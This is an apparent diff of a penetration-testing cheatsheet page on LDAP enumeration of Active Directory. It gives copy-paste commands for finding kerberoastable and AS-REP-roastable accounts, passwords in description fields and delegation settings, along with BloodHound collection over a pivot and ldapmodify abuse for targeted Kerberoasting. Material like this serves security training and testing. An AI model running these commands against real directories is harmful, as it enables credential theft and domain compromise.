-</span></span></code></pre></div><h2 id="viii-ldap-signing-and-channel-binding" data-heading-permalink="true"><span class="heading-content">viii. LDAP signing and channel binding</span>
-    <a class="heading-permalink" href="#viii-ldap-signing-and-channel-binding" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u <span class="s2">&#34;</span><span class="nv">$USER</span><span class="s2">&#34;</span> -p <span class="s2">&#34;</span><span class="nv">$PASS</span><span class="s2">&#34;</span> -M ldap-checker
-</span></span><span class="line"><span class="cl"><span class="c1">## or check manually:</span>
-</span></span><span class="line"><span class="cl">ldapsearch -x -H ldap://<span class="nv">$DC</span> -b <span class="s2">&#34;&#34;</span> -s base
-</span></span><span class="line"><span class="cl"><span class="c1">## If anonymous bind works on 389 -&gt; LDAP signing NOT required</span>
-</span></span><span class="line"><span class="cl"><span class="c1">## If LDAPS rejects PLAIN -&gt; channel binding enforced</span>
-</span></span></code></pre></div><p>Why it matters: NTLM relay to LDAP/LDAPS works only when signing is off and channel binding is not enforced. See <a href="https://jinpwn.dev/cheatsheets/active-directory/ad06-llmnr--ntlm-relay/">AD06 LLMNR &amp; NTLM Relay</a>
-.</p>
-
-        </div>
-
-        
-          <nav class="cheatsheet-pager is-split" aria-label="Sibling cheatsheet navigation"><a class="cheatsheet-pager-link is-prev" href="/cheatsheets/misc/file-transfer/">
-            <div class="cheatsheet-pager-copy">
-              <span class="cheatsheet-pager-label">Previous</span>
-              <span class="cheatsheet-pager-title">File Transfer</span>
-            </div>
-            <span class="cheatsheet-pager-arrow" aria-hidden="true">
-              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
-    <path d="m12 19-7-7 7-7"></path>
-    <path d="M19 12H5"></path>
-  </svg>
-            </span>
-          </a><a class="cheatsheet-pager-link is-next" href="/cheatsheets/misc/password-cracking/">
-            <div class="cheatsheet-pager-copy">
-              <span class="cheatsheet-pager-label">Next</span>
-              <span class="cheatsheet-pager-title">Password Cracking</span>
-            </div>
-            <span class="cheatsheet-pager-arrow" aria-hidden="true">
-              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon is-next" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
-    <path d="m12 19-7-7 7-7"></path>
-    <path d="M19 12H5"></path>
-  </svg>
-            </span>
-          </a></nav>
-        
-      </div>
-    </div>
-  </article>
-  
-
-  </main>
-  <button class="scroll-top-button" type="button" data-scroll-top aria-label="Scroll to top" aria-hidden="true" tabindex="-1">
-    <svg viewBox="0 0 24 24" aria-hidden="true">
-      <path d="M12 18V6"></path>
-      <path d="M6.75 11.25 12 6l5.25 5.25"></path>
-    </svg>
-  </button>
-  <footer class="site-footer">
-  <p>&copy; 2026 JinPwn</p>
-</footer>
-
-</body>
-</html>
+<!doctype html><html lang=en-US dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>LDAP | JinPwn</title><meta name=description content="LDAP enum against Active Directory and standalone directories. AD-specific attacks (kerberoast, ASREP, ACL abuse) live in 00 AD MOC ."><meta name=robots content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1"><meta name=googlebot content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1"><link rel=canonical href=https://jinpwn.dev/cheatsheets/misc/ldap/><meta property="og:title" content="LDAP | JinPwn"><meta property="og:description" content="LDAP enum against Active Directory and standalone directories. AD-specific attacks (kerberoast, ASREP, ACL abuse) live in 00 AD MOC ."><meta property="og:type" content="website"><meta property="og:url" content="https://jinpwn.dev/cheatsheets/misc/ldap/"><meta property="og:site_name" content="JinPwn"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://jinpwn.dev/images/og/og.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="LDAP | JinPwn"><meta name=twitter:description content="LDAP enum against Active Directory and standalone directories. AD-specific attacks (kerberoast, ASREP, ACL abuse) live in 00 AD MOC ."><meta name=twitter:image content="https://jinpwn.dev/images/og/og.png"><meta name=twitter:site content="@jinpwn"><meta name=twitter:creator content="@jinpwn"><script type=application/ld+json>{"@context":"https://schema.org","@type":"WebPage","description":"LDAP enum against Active Directory and standalone directories. AD-specific attacks (kerberoast, ASREP, ACL abuse) live in 00 AD MOC .","image":["https://jinpwn.dev/images/og/og.png"],"inLanguage":"en-US","name":"LDAP | JinPwn","url":"https://jinpwn.dev/cheatsheets/misc/ldap/"}</script><meta name=theme-color content="#111111"><link rel=icon type=image/png href=/favicon.png><link rel=stylesheet href=/css/site.min.bbc8db26832d45b71fab2c52bea8e7468ac7f3d71458dff1936b8d5891ff48a8.css integrity="sha256-u8jbJoMtRbcfqyxSvqjnRorH89cUWN/xk2uNWJH/SKg=" crossorigin=anonymous><script src=/js/main.e9594fc927ccbd51f2ef3a698abafb8bbf09dcc796037e0a51eedfb14ca858f4.js integrity="sha256-6VlPySfMvVHy7zppirr7i78J3MeWA34KUe7fsUyoWPQ=" crossorigin=anonymous defer></script><script src=/js/asm-highlight.d74879c0e3b6982d95821f5d83904fa40660a6a7e4a2442cdc4bda545679f540.js integrity="sha256-10h5wOO2mC2Vgh9dg5BPpAZgpqfkokQs3EvaVFZ59UA=" crossorigin=anonymous defer></script></head><body><header class=site-header><nav class=top-nav><div class="container nav-inner"><div class=nav-left><a href=/ class="brand-link has-logo" aria-label=Home><img src=/favicon.png alt=jinpwn.dev class=brand-logo style=--brand-logo-height:36px></a><div class="nav-links desktop-only"><a href=/>Posts</a>
+<a href=/posts/>Archive</a>
+<a href=/cheatsheets/ class=is-current>Cheatsheets</a>
+<a href=/about/>About</a></div></div><div class=nav-actions><div class=search-anchor id=search-root data-search-root><label class=search-trigger for=search-input><span class=search-glyph aria-hidden=true><svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.35-3.35"/></svg>
+</span><input id=search-input type=search placeholder=Search... autocomplete=off spellcheck=false aria-label="Search posts and cheatsheets">
+<button type=button class=search-clear data-search-clear aria-label="Clear search" hidden>
+<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg>
+</button>
+<span class="search-trigger-shortcut desktop-only" aria-hidden=true>CTRL K</span></label><div id=search-dropdown class=search-dropdown hidden data-search-index-url=/search-index.json data-search-runtime-url=/js/search-flex.1b1c225e3d6a2ff08480727a5e3bf93df59715e138fede75b7616d9c75fc4fa7.js><p class=search-status data-search-status aria-live=polite>Type to search posts and cheatsheets.</p><div class=search-results data-search-results role=listbox aria-label="Search results"><p class=search-empty>Type to search posts and cheatsheets.</p></div></div></div><button class="icon-button mobile-only" type=button data-search-mobile-toggle aria-label=Search aria-expanded=false aria-controls=search-root>
+<svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.35-3.35"/></svg>
+</button>
+<button class="icon-button mobile-only" type=button data-mobile-toggle aria-label="Toggle menu" aria-expanded=false aria-controls=mobile-nav>
+<svg viewBox="0 0 24 24" aria-hidden="true" data-menu-open-icon=""><path d="M3 6h18"/><path d="M3 12h18"/><path d="M3 18h18"/></svg>
+<svg viewBox="0 0 24 24" aria-hidden="true" data-menu-close-icon="" hidden=""><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg></button></div></div><div id=mobile-nav class=mobile-nav><a href=/>Posts</a>
+<a href=/posts/>Archive</a>
+<a href=/cheatsheets/ class=is-current>Cheatsheets</a>
+<a href=/about/>About</a></div></nav></header><main class=site-main><article class="container cheatsheet-docs-shell"><div class=cheatsheet-docs-layout><aside class=cheatsheet-sidebar aria-label="Misc navigation"><div class=cheatsheet-sidebar-inner><a href=/cheatsheets/ class=cheatsheet-sidebar-root>All cheatsheets</a>
+<a href=/cheatsheets/misc/ class=cheatsheet-sidebar-section>Misc</a><nav class=cheatsheet-sidebar-nav><ul class=cheatsheet-sidebar-list><li><a href=/cheatsheets/misc/00-tooling-moc/ class=cheatsheet-sidebar-link>Tooling MOC</a></li><li><a href=/cheatsheets/misc/file-transfer/ class=cheatsheet-sidebar-link>File Transfer</a></li><li><a href=/cheatsheets/misc/ldap/ class="cheatsheet-sidebar-link is-current">LDAP</a></li><li><a href=/cheatsheets/misc/password-cracking/ class=cheatsheet-sidebar-link>Password Cracking</a></li><li><a href=/cheatsheets/misc/pivoting/ class=cheatsheet-sidebar-link>Pivoting</a></li><li><a href=/cheatsheets/misc/recon-external/ class=cheatsheet-sidebar-link>Recon (external)</a></li><li><a href=/cheatsheets/misc/reverse-shells/ class=cheatsheet-sidebar-link>Reverse Shells</a></li></ul></nav></div></aside><div class="cheatsheet-docs-main cheatsheet-page-main"><header class=cheatsheet-page-header><h1>LDAP</h1></header><details class=cheatsheet-mobile-sections><summary class=cheatsheet-mobile-sections-summary><span class=cheatsheet-mobile-sections-label>Sections</span>
+<span class=cheatsheet-mobile-sections-current>LDAP</span>
+<span class=cheatsheet-mobile-sections-caret aria-hidden=true></span></summary><div class=cheatsheet-mobile-sections-panel><nav aria-label="Misc sections"><ul class=cheatsheet-mobile-sections-list><li><a href=/cheatsheets/ class="cheatsheet-mobile-sections-link cheatsheet-mobile-sections-root">All cheatsheets</a></li><li><a href=/cheatsheets/misc/ class=cheatsheet-mobile-sections-link>Overview</a></li><li><a href=/cheatsheets/misc/00-tooling-moc/ class=cheatsheet-mobile-sections-link>Tooling MOC</a></li><li><a href=/cheatsheets/misc/file-transfer/ class=cheatsheet-mobile-sections-link>File Transfer</a></li><li><a href=/cheatsheets/misc/ldap/ class="cheatsheet-mobile-sections-link is-current">LDAP</a></li><li><a href=/cheatsheets/misc/password-cracking/ class=cheatsheet-mobile-sections-link>Password Cracking</a></li><li><a href=/cheatsheets/misc/pivoting/ class=cheatsheet-mobile-sections-link>Pivoting</a></li><li><a href=/cheatsheets/misc/recon-external/ class=cheatsheet-mobile-sections-link>Recon (external)</a></li><li><a href=/cheatsheets/misc/reverse-shells/ class=cheatsheet-mobile-sections-link>Reverse Shells</a></li></ul></nav></div></details><div class="markdown-content cheatsheet-page-body"><p>LDAP enum against Active Directory and standalone directories. AD-specific attacks (kerberoast, ASREP, ACL abuse) live in <a href=https://jinpwn.dev/cheatsheets/active-directory/00-ad-moc/>00 AD MOC</a>
+.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>DC</span><span class=o>=</span>10.10.11.50
+</span></span><span class=line><span class=cl><span class=nv>DOMAIN</span><span class=o>=</span>corp.local
+</span></span><span class=line><span class=cl><span class=nv>BASE</span><span class=o>=</span><span class=s1>&#39;DC=corp,DC=local&#39;</span>
+</span></span><span class=line><span class=cl><span class=nv>USER</span><span class=o>=</span><span class=s1>&#39;svc_user&#39;</span>
+</span></span><span class=line><span class=cl><span class=nv>PASS</span><span class=o>=</span><span class=s1>&#39;Password1&#39;</span>
+</span></span></code></pre></div><h2 id=i-anonymous-bind data-heading-permalink=true><span class=heading-content>i. Anonymous bind</span>
+<a class=heading-permalink href=#i-anonymous-bind aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Lot of misconfigured DCs allow anonymous read. Always try first.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ldapsearch -x -H ldap://<span class=nv>$DC</span> -s base namingcontexts
+</span></span><span class=line><span class=cl>ldapsearch -x -H ldap://<span class=nv>$DC</span> -b <span class=s2>&#34;</span><span class=nv>$BASE</span><span class=s2>&#34;</span>
+</span></span></code></pre></div><p>What to grep for in anonymous output:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ldapsearch -x -H ldap://<span class=nv>$DC</span> -b <span class=s2>&#34;</span><span class=nv>$BASE</span><span class=s2>&#34;</span> <span class=p>|</span> grep -iE <span class=s1>&#39;description|userpassword|info|comment&#39;</span>
+</span></span></code></pre></div><h2 id=ii-authenticated-bind data-heading-permalink=true><span class=heading-content>ii. Authenticated bind</span>
+<a class=heading-permalink href=#ii-authenticated-bind aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ldapsearch -x -H ldap://<span class=nv>$DC</span> -D <span class=s2>&#34;</span><span class=nv>$USER</span><span class=s2>@</span><span class=nv>$DOMAIN</span><span class=s2>&#34;</span> -w <span class=s2>&#34;</span><span class=nv>$PASS</span><span class=s2>&#34;</span> -b <span class=s2>&#34;</span><span class=nv>$BASE</span><span class=s2>&#34;</span>
+</span></span></code></pre></div><p>Over LDAPS (encrypted, needed for password changes and some attacks):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ldapsearch -x -H ldaps://<span class=nv>$DC</span> -D <span class=s2>&#34;</span><span class=nv>$USER</span><span class=s2>@</span><span class=nv>$DOMAIN</span><span class=s2>&#34;</span> -w <span class=s2>&#34;</span><span class=nv>$PASS</span><span class=s2>&#34;</span> -b <span class=s2>&#34;</span><span class=nv>$BASE</span><span class=s2>&#34;</span>
+</span></span></code></pre></div><p>GSSAPI / Kerberos auth (no password on the command line):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>kinit <span class=s2>&#34;</span><span class=nv>$USER</span><span class=s2>@</span><span class=si>${</span><span class=nv>DOMAIN</span><span class=p>^^</span><span class=si>}</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl>ldapsearch -Y GSSAPI -H ldap://<span class=nv>$DC</span> -b <span class=s2>&#34;</span><span class=nv>$BASE</span><span class=s2>&#34;</span>
+</span></span></code></pre></div><h2 id=iii-useful-filters-copy-paste data-heading-permalink=true><span class=heading-content>iii. Useful filters, copy-paste</span>
+<a class=heading-permalink href=#iii-useful-filters-copy-paste aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Replace the filter after <code>-b "$BASE"</code> to target specific objects.</p><p>All users:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ldapsearch -x -H ldap://<span class=nv>$DC</span> -D <span class=s2>&#34;</span><span class=nv>$USER</span><span class=s2>@</span><span class=nv>$DOMAIN</span><span class=s2>&#34;</span> -w <span class=s2>&#34;</span><span class=nv>$PASS</span><span class=s2>&#34;</span> -b <span class=s2>&#34;</span><span class=nv>$BASE</span><span class=s2>&#34;</span> <span class=s1>&#39;(&amp;(objectClass=user)(objectCategory=person))&#39;</span> samaccountname description
+</span></span></code></pre></div><p>All computers:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ldapsearch -x -H ldap://<span class=nv>$DC</span> -D <span class=s2>&#34;</span><span class=nv>$USER</span><span class=s2>@</span><span class=nv>$DOMAIN</span><span class=s2>&#34;</span> -w <span class=s2>&#34;</span><span class=nv>$PASS</span><span class=s2>&#34;</span> -b <span class=s2>&#34;</span><span class=nv>$BASE</span><span class=s2>&#34;</span> <span class=s1>&#39;(objectClass=computer)&#39;</span> dnshostname operatingsystem
+</span></span></code></pre></div><p>Domain admins:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ldapsearch -x -H ldap://<span class=nv>$DC</span> -D <span class=s2>&#34;</span><span class=nv>$USER</span><span class=s2>@</span><span class=nv>$DOMAIN</span><span class=s2>&#34;</span> -w <span class=s2>&#34;</span><span class=nv>$PASS</span><span class=s2>&#34;</span> -b <span class=s2>&#34;</span><span class=nv>$BASE</span><span class=s2>&#34;</span> <span class=s1>&#39;(&amp;(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local))&#39;</span> samaccountname
+</span></span></code></pre></div><p>Kerberoastable accounts (users with SPN):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ldapsearch -x -H ldap://<span class=nv>$DC</span> -D <span class=s2>&#34;</span><span class=nv>$USER</span><span class=s2>@</span><span class=nv>$DOMAIN</span><span class=s2>&#34;</span> -w <span class=s2>&#34;</span><span class=nv>$PASS</span><span class=s2>&#34;</span> -b <span class=s2>&#34;</span><span class=nv>$BASE</span><span class=s2>&#34;</span> <span class=s1>&#39;(&amp;(objectClass=user)(servicePrincipalName=*))&#39;</span> samaccountname serviceprincipalname
+</span></span></code></pre></div><p>AS-REP roastable (PreAuth not required):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ldapsearch -x -H ldap://<span class=nv>$DC</span> -D <span class=s2>&#34;</span><span class=nv>$USER</span><span class=s2>@</span><span class=nv>$DOMAIN</span><span class=s2>&#34;</span> -w <span class=s2>&#34;</span><span class=nv>$PASS</span><span class=s2>&#34;</span> -b <span class=s2>&#34;</span><span class=nv>$BASE</span><span class=s2>&#34;</span> <span class=s1>&#39;(&amp;(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))&#39;</span> samaccountname
+</span></span></code></pre></div><p>Passwords in description field (classic mistake):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ldapsearch -x -H ldap://<span class=nv>$DC</span> -D <span class=s2>&#34;</span><span class=nv>$USER</span><span class=s2>@</span><span class=nv>$DOMAIN</span><span class=s2>&#34;</span> -w <span class=s2>&#34;</span><span class=nv>$PASS</span><span class=s2>&#34;</span> -b <span class=s2>&#34;</span><span class=nv>$BASE</span><span class=s2>&#34;</span> <span class=s1>&#39;(description=*)&#39;</span> samaccountname description <span class=p>|</span> grep -iE <span class=s1>&#39;samaccount|descr&#39;</span>
+</span></span></code></pre></div><p>Constrained / Unconstrained delegation:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>## Unconstrained</span>
+</span></span><span class=line><span class=cl>ldapsearch ... <span class=s1>&#39;(userAccountControl:1.2.840.113556.1.4.803:=524288)&#39;</span> samaccountname
+</span></span><span class=line><span class=cl><span class=c1>## Constrained (any account with msDS-AllowedToDelegateTo)</span>
+</span></span><span class=line><span class=cl>ldapsearch ... <span class=s1>&#39;(msDS-AllowedToDelegateTo=*)&#39;</span> samaccountname msDS-AllowedToDelegateTo
+</span></span></code></pre></div><p>GPO objects, often have passwords in old groups.xml:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ldapsearch ... <span class=s1>&#39;(objectClass=groupPolicyContainer)&#39;</span> displayname gpcfilesyspath
+</span></span></code></pre></div><h2 id=iv-useraccountcontrol-decoder data-heading-permalink=true><span class=heading-content>iv. UserAccountControl decoder</span>
+<a class=heading-permalink href=#iv-useraccountcontrol-decoder aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Common UAC bit flags you see in queries:</p><table><thead><tr><th>Decimal</th><th>Hex</th><th>Meaning</th></tr></thead><tbody><tr><td>512</td><td>0x200</td><td>Normal account</td></tr><tr><td>514</td><td>0x202</td><td>Disabled account</td></tr><tr><td>528</td><td>0x210</td><td>Locked</td></tr><tr><td>2048</td><td>0x800</td><td>InterDomain trust</td></tr><tr><td>4096</td><td>0x1000</td><td>Workstation trust</td></tr><tr><td>8192</td><td>0x2000</td><td>DC account</td></tr><tr><td>66048</td><td>0x10200</td><td>Password never expires</td></tr><tr><td>4194304</td><td>0x400000</td><td>No PreAuth required (ASREP-roastable)</td></tr><tr><td>524288</td><td>0x80000</td><td>Trusted for unconstrained delegation</td></tr><tr><td>16777216</td><td>0x1000000</td><td>Trusted to auth for delegation</td></tr></tbody></table><p>Filter syntax for bit-test: <code>(userAccountControl:1.2.840.113556.1.4.803:=FLAG)</code>.</p><h2 id=v-bulk-enum-tools data-heading-permalink=true><span class=heading-content>v. Bulk enum tools</span>
+<a class=heading-permalink href=#v-bulk-enum-tools aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>nxc LDAP, fastest for one-shot enum:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nxc ldap <span class=nv>$DC</span> -u <span class=s2>&#34;</span><span class=nv>$USER</span><span class=s2>&#34;</span> -p <span class=s2>&#34;</span><span class=nv>$PASS</span><span class=s2>&#34;</span> --users
+</span></span><span class=line><span class=cl>nxc ldap <span class=nv>$DC</span> -u <span class=s2>&#34;</span><span class=nv>$USER</span><span class=s2>&#34;</span> -p <span class=s2>&#34;</span><span class=nv>$PASS</span><span class=s2>&#34;</span> --groups
+</span></span><span class=line><span class=cl>nxc ldap <span class=nv>$DC</span> -u <span class=s2>&#34;</span><span class=nv>$USER</span><span class=s2>&#34;</span> -p <span class=s2>&#34;</span><span class=nv>$PASS</span><span class=s2>&#34;</span> --asreproast asrep.out
+</span></span><span class=line><span class=cl>nxc ldap <span class=nv>$DC</span> -u <span class=s2>&#34;</span><span class=nv>$USER</span><span class=s2>&#34;</span> -p <span class=s2>&#34;</span><span class=nv>$PASS</span><span class=s2>&#34;</span> --kerberoasting krb.out
+</span></span><span class=line><span class=cl>nxc ldap <span class=nv>$DC</span> -u <span class=s2>&#34;</span><span class=nv>$USER</span><span class=s2>&#34;</span> -p <span class=s2>&#34;</span><span class=nv>$PASS</span><span class=s2>&#34;</span> --trusted-for-delegation
+</span></span><span class=line><span class=cl>nxc ldap <span class=nv>$DC</span> -u <span class=s2>&#34;</span><span class=nv>$USER</span><span class=s2>&#34;</span> -p <span class=s2>&#34;</span><span class=nv>$PASS</span><span class=s2>&#34;</span> --password-not-required
+</span></span><span class=line><span class=cl>nxc ldap <span class=nv>$DC</span> -u <span class=s2>&#34;</span><span class=nv>$USER</span><span class=s2>&#34;</span> -p <span class=s2>&#34;</span><span class=nv>$PASS</span><span class=s2>&#34;</span> --admin-count
+</span></span><span class=line><span class=cl>nxc ldap <span class=nv>$DC</span> -u <span class=s2>&#34;</span><span class=nv>$USER</span><span class=s2>&#34;</span> -p <span class=s2>&#34;</span><span class=nv>$PASS</span><span class=s2>&#34;</span> --get-desc-users
+</span></span></code></pre></div><p>windapsearch, more verbose dumps:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>windapsearch --dc-ip <span class=nv>$DC</span> -d <span class=s2>&#34;</span><span class=nv>$DOMAIN</span><span class=s2>&#34;</span> -u <span class=s2>&#34;</span><span class=nv>$USER</span><span class=s2>&#34;</span> -p <span class=s2>&#34;</span><span class=nv>$PASS</span><span class=s2>&#34;</span> --da
+</span></span><span class=line><span class=cl>windapsearch --dc-ip <span class=nv>$DC</span> -d <span class=s2>&#34;</span><span class=nv>$DOMAIN</span><span class=s2>&#34;</span> -u <span class=s2>&#34;</span><span class=nv>$USER</span><span class=s2>&#34;</span> -p <span class=s2>&#34;</span><span class=nv>$PASS</span><span class=s2>&#34;</span> --privileged-users
+</span></span><span class=line><span class=cl>windapsearch --dc-ip <span class=nv>$DC</span> -d <span class=s2>&#34;</span><span class=nv>$DOMAIN</span><span class=s2>&#34;</span> -u <span class=s2>&#34;</span><span class=nv>$USER</span><span class=s2>&#34;</span> -p <span class=s2>&#34;</span><span class=nv>$PASS</span><span class=s2>&#34;</span> --computers
+</span></span></code></pre></div><p>ldapdomaindump, HTML report with everything:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ldapdomaindump <span class=nv>$DC</span> -u <span class=s2>&#34;</span><span class=nv>$DOMAIN</span><span class=s2>\\</span><span class=nv>$USER</span><span class=s2>&#34;</span> -p <span class=s2>&#34;</span><span class=nv>$PASS</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl><span class=c1>## Outputs: domain_users.html, domain_computers.html, domain_groups.html</span>
+</span></span></code></pre></div><h2 id=vi-bloodhound-ingest data-heading-permalink=true><span class=heading-content>vi. BloodHound ingest</span>
+<a class=heading-permalink href=#vi-bloodhound-ingest aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Primary collector, rusthound-ce, fast and accurate for most edges:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>rusthound-ce -d <span class=s2>&#34;</span><span class=nv>$DOMAIN</span><span class=s2>&#34;</span> -u <span class=s2>&#34;</span><span class=nv>$USER</span><span class=s2>&#34;</span> -p <span class=s2>&#34;</span><span class=nv>$PASS</span><span class=s2>&#34;</span> -i <span class=nv>$DC</span> --zip
+</span></span><span class=line><span class=cl><span class=c1>## Output: 20XX-XX-XX-corp.local-rusthound.zip</span>
+</span></span></code></pre></div><p>Over a SOCKS pivot:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>proxychains -q rusthound-ce -d <span class=s2>&#34;</span><span class=nv>$DOMAIN</span><span class=s2>&#34;</span> -u <span class=s2>&#34;</span><span class=nv>$USER</span><span class=s2>&#34;</span> -p <span class=s2>&#34;</span><span class=nv>$PASS</span><span class=s2>&#34;</span> -i <span class=nv>$DC</span> --zip
+</span></span></code></pre></div><div class="obsidian-callout callout-warning"><div class=obsidian-callout-header><div class=obsidian-callout-icon aria-hidden=true><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m21.73 18-8-14a2 2 0 00-3.48.0l-8 14A2 2 0 004 21h16a2 2 0 001.73-3z"/><path d="M12 9v4"/><path d="M12 17h.01"/></svg></div><span class=obsidian-callout-title>Missing outbound object control</span></div><div class=obsidian-callout-body><p>rusthound-ce sometimes misses certain outbound ACL edges (WriteOwner, GenericAll on objects outside the user&rsquo;s OU, etc). When BloodHound looks too clean, run bloodyAD too.</p></div></div><p>Fallback / supplement, bloodyAD, exports a BloodHound-compatible zip:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bloodyAD --host <span class=nv>$DC</span> -d <span class=s2>&#34;</span><span class=nv>$DOMAIN</span><span class=s2>&#34;</span> -u <span class=s2>&#34;</span><span class=nv>$USER</span><span class=s2>&#34;</span> -p <span class=s2>&#34;</span><span class=nv>$PASS</span><span class=s2>&#34;</span> get bloodhound --output bh-bloody.zip
+</span></span></code></pre></div><p>Through pivot:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>proxychains -q bloodyAD --host <span class=nv>$DC</span> -d <span class=s2>&#34;</span><span class=nv>$DOMAIN</span><span class=s2>&#34;</span> -u <span class=s2>&#34;</span><span class=nv>$USER</span><span class=s2>&#34;</span> -p <span class=s2>&#34;</span><span class=nv>$PASS</span><span class=s2>&#34;</span> get bloodhound --output bh-bloody.zip
+</span></span></code></pre></div><div class="obsidian-callout callout-tip"><div class=obsidian-callout-header><div class=obsidian-callout-icon aria-hidden=true><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M8.5 14.5A2.5 2.5.0 0011 12c0-1.38-.5-2-1-3-1.072-2.143-.224-4.054 2-6 .5 2.5 2 4.9 4 6.5s3 3.5 3 5.5A7 7 0 115 15c0-1.153.433-2.294 1-3a2.5 2.5.0 002.5 2.5z"/></svg></div><span class=obsidian-callout-title>Upload both</span></div><div class=obsidian-callout-body><p>When in doubt, run both tools and drop both zips into BloodHound. The graph merges and you get the union of edges. Catches the ACLs rusthound-ce silently skipped.</p></div></div><h2 id=vii-modify-objects-write-level-access data-heading-permalink=true><span class=heading-content>vii. Modify objects (write-level access)</span>
+<a class=heading-permalink href=#vii-modify-objects-write-level-access aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>If BloodHound shows you have write rights to an object, abuse with:</p><p>ldapmodify, raw:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ldapmodify -x -H ldaps://<span class=nv>$DC</span> -D <span class=s2>&#34;</span><span class=nv>$USER</span><span class=s2>@</span><span class=nv>$DOMAIN</span><span class=s2>&#34;</span> -w <span class=s2>&#34;</span><span class=nv>$PASS</span><span class=s2>&#34;</span> <span class=s>&lt;&lt;EOF
+</span></span></span><span class=line><span class=cl><span class=s>dn: CN=target,CN=Users,$BASE
+</span></span></span><span class=line><span class=cl><span class=s>changetype: modify
+</span></span></span><span class=line><span class=cl><span class=s>replace: servicePrincipalName
+</span></span></span><span class=line><span class=cl><span class=s>servicePrincipalName: cifs/anything
+</span></span></span><span class=line><span class=cl><span class=s>EOF</span>
+</span></span></code></pre></div><p>Targeted Kerberoast (set SPN, roast, remove SPN):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>targetedKerberoast.py -d <span class=s2>&#34;</span><span class=nv>$DOMAIN</span><span class=s2>&#34;</span> -u <span class=s2>&#34;</span><span class=nv>$USER</span><span class=s2>&#34;</span> -p <span class=s2>&#34;</span><span class=nv>$PASS</span><span class=s2>&#34;</span> --dc-ip <span class=nv>$DC</span>
